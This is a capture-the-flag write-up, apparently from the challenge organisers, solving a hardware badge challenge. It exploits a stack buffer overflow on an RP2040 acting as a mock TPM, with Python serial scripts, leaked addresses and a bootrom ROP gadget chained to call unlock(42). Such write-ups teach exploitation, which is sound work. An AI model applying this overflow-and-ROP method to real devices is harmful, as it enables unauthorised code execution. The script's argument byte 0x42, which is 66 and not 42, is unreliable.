# Challenge 4

In this challenge, a menu of commands is shown:

```
Available commands:
 * HELP    - this menu
 * VERSION - get version info
 * CLOCK   - clock info
 * REGS    - dump registers
 * UNLOCK  - unlock this vault
 * EXIT    - exit
```

A code snippet presented via mass storage shows us that the unlock function is called with a value of `0`, whereas it only unlocks on a value of `42`:

```c
void unlock(int key) {
    uart_printf("Unlock function located at 0x%p\r\n", unlock);

    if(key != 42) { uart_printf("Wrong key\r\n"); return; }
    char flag[48] = {0};

    if(key != 42) { uart_printf("Wrong key\r\n"); return; }

    //[..]

    if(key != 42) { uart_printf("Wrong key\r\n"); return; }
    uart_printf("Unlocked vault: %s\r\n", flag);
}
```

Additionally, another snippet hints the attack vector to be a stack buffer overflow:

```c
void chall4_handler(char *input, int len) {
    char cmd[8];
    memcpy(cmd, input, len);
    //[..]
}
```

Simply guessing the address where the flag is printed is not sufficient, as the flag gets built in steps with argument checks all around them. Therefore, a seemingly good solution is to build a ROP chain that calls `unlock(42)`.

------------

## Identifying TPM chip

The TPM chip is covered in opaque epoxy resin, and does not have any visible markings or exposed debug peripherals. Executing the `REGS` command shows us at least that we're likely dealing with a 32-bit ARM chip:

```
Register dump function located at 0x10000455

R0:  00000000   R1:  20040f5c   R2:  00000003   R3:  00000003
R4:  10004f40   R5:  00000006   R6:  18000000   R7:  00000000
R8:  ffffffff   R9:  ffffffff   R10: ffffffff   R11: ffffffff
R12: 00000024   R13: 20041f80   R14: 10003629   R15: 100004a4
```

Exploring further shows that the chip version is `RP2-B2`, which upon some internet searching shows that this is a RP2040 just like the other chip on the challenge badge, with bootrom version `B2`.
```
Version function located at 0x100003D5
ROM version: 3
Chip version: 2 (RP2-B2)
```

------------

## Building the ROP chain

Some of the commands leak their address when you execute them:
```
Clock function located at 0x10000409
Core number: 0
Clock (REF): 12000000 Hz
Clock (SYS): 125000000 Hz
```

We can overflow `cmd` with the (little-endian) addresses of these functions to validate that the return address of the function that called `chall4_handler` is located at `cmd + 12 bytes`:

```python
import sys, serial

with serial.Serial(sys.argv[1], 115200, timeout=1) as port:
	version_le = b"\xD5\x03\x00\x10"
	clock_le = b"\x09\x04\x00\x10"
	regs_le = b"\x55\x04\x00\x10"
	unlock_le = b"\x0D\x03\x00\x10"
	port.write(version_le + clock_le + regs_le + unlock_le + b"\n")
	while True:
		print(port.read(1024))
```

```python
b'\xd5\x03\x00\x10\t\x04\x00\x10U\x04\x00\x10\r\x03\x00\x10\r\nFrom TPM:\r\nUnknown command\r\nUnlock function located at 0x1000030D\r\nWrong key\r\n'
```

So our first gadget should appear at 12 bytes offset into our payload. Next, we need to find a gadget that puts `42` in register `r0` (which is the first function argument in the ARM EABI) and then jumps to the address of `unlock()`. A common tool for finding gadgets is [ropper](https://github.com/sashs/ropper).

Since we know that the "TPM" RP2040 is running bootrom version B2 just like the other chip on the badge, we could dump the bootrom via USB using `picotool` just like in the first challenge. However, as the RP2040 is open source, we can also just download the bootrom version we need from [https://github.com/raspberrypi/pico-bootrom/releases](https://github.com/raspberrypi/pico-bootrom/releases). Loading `b2.elf` into ropper yields a great candidate gadget:

```bash
> ropper -a ARMTHUMB -f b2.elf 
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======
[..]
0x00003a54 (0x00003a55): pop {r0, r3, r4, r5, pc}; 
```

This gadget pops 4 bytes from the stack into `r0` (which we can use to set it to `42`), 12 bytes into registers we won't use, and 4 bytes into `pc` (which we can use to call `unlock()`). Our payload should look something like this now:

```
<12 bytes filler>
<4 bytes gadget address>
<4 bytes integer 42 value>
<12 bytes filler>
<4 bytes unlock address>
```

------------

## Putting it all together
```python
import sys, serial

with serial.Serial(sys.argv[1], 115200, timeout=1) as port:
	unlock_le = b"\x0D\x03\x00\x10"
	gadget_le = b"\x54\x3A\x00\x00"
	param_le = b"\x42\x00\x00\x00"

	payload = b"A"*12 + gadget_le + param_le + b"A"*12 + unlock_le

	port.write(payload + b"\n")
	while True:
		print(port.read(1024))
```

With some creativity this challenge could be wrangled to dump the other challenge's flags too. Since the effort to do this blindly was in our view comparable to actually doing the other challenges, it was deliberately kept in. It was amazing to see a few teams cleverly making use of this trick to get all flags at once. Well done!